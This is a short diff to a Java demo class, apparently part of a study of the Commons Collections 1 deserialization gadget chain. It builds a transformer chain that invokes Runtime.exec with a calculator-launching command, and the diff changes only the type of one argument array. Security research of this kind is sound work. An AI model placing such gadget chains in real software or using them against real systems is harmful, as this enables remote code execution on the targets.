@@ -19,7 +19,7 @@ public class CC1Demo1 {
     public static void main(String[] args) {
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.getRuntime()),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
+                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"open -a Calculator"})
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
